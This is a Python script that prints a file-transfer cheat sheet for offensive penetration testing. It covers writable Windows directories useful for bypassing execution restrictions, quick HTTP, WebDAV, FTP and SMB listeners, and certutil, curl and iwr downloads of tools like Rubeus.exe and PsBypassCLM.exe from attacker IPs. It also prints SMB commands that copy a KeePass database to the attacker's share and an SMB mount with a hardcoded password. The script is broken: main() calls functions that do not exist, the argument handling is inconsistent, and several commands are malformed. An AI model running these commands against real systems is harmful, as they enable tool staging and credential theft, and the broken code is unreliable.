#!/usr/bin/python3

import sys
import subprocess
from base64 import b64encode
import argparse

def paths():

    print("\n********** Windows **********\n")
    print(f"C:\Windows\Tasks") 
    print(f"C:\Windows\Temp")
    print(f"C:\windows\\tracing")
    print(f"C:\Windows\Registration\CRMLog")
    print(f"C:\Windows\System32\FxsTmp")
    print(f"C:\Windows\System32\com\dmp")
    print(f"C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys")
    print(f"C:\Windows\System32\spool\PRINTERS")
    print(f"C:\Windows\System32\spool\SERVERS")
    print(f"C:\Windows\System32\spool\drivers\color")
    print(f"C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter")
    print(f"C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)")
    print(f"C:\Windows\SysWOW64\FxsTmp")
    print(f"C:\Windows\SysWOW64\com\dmp")
    print(f"C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter")
    print(f"C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System")

    print("\n********** Linux **********\n")
    print(f"find / -writable -type d 2>/dev/null")
    print(f"/tmp")
    print(f"/dev/shm")

def installs():
    print("pip3 install wsgidav")
    print("pip install pyftpdlib")

def print_listener(port):
    print("\n********** Listener **********\n")
    print(f"python3 -m http.server {port}")
    print(f"php -S 0.0.0.0{port}")
    print("ruby -run -e httpd . -p 8000")
    print(f"wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/")
    print(f"python -m pyftpdlib -p21 -w")
    print(f"impacket-smbserver share $(pwd) -smb2support")

def http_transfer(ip, port, file):
    print("\n********** HTTP **********\n\n")
    print("\n********** Windows **********\n")
    print(f"certutil.exe -f -urlcache -split http://{ip}{port}/{file}")
    print(f"certutil -decode payload.b64 payload.dll")
    print(f"certutil -encode payload.dll payload.b64")
    print(f"curl 10.10.14.29/Rubeus.exe -o Rubeus.exe")
    print(f"wget http://192.168.1.2/putty.exe -OutFile putty.exe")
    print(f"iwr -uri http://10.10.14.29/PS.exe -OutFile PsBypassCLM.exe")
    print(f"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12")

    print("\n********** Linux **********\n")

def smb_transfer(ip, file):
    print(f"copy CEH.kdbx \\10.10.14.3\smbFolder\CEH.kdbx De Win a nuestro parrot")
    print(f"copy \\10.10.14.3\smbFolder\CEH.kdbx CEH.kdbx De parrot a Win")
    print(f"net use x: \\10.185.10.34\smbFolder /user:share_admin Wind0wz87!kj")
    print(f"X: para usar esta unidad compartida") 
    print(f"net view \\10.10.14.3\smbFolder")



def main():
    if len(sys.argv) < 4:
        print("Usage: transfer <IP> <PORT> <FILE> <MODE>")
        print("Examples: ")
        print("Shells: \n\t-paths \n\t-install \n\t-share \n\t-http \n\t-smb")
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]
    shell_type = sys.argv[3].lower()


    if shell_type == "-paths":
        print_powershell(ip, port)
    elif shell_type == "-install":
        print_powercat(ip, port)
    elif shell_type == "-share":
        print_nishang(ip, port)
    elif shell_type == "-http":
        print_bash(ip, port)
    elif shell_type == "-smb":
        print_php(ip, port)

    else:
        print(f"Mode '{shell_type}' not recognized.")

if __name__ == "__main__":
    main()
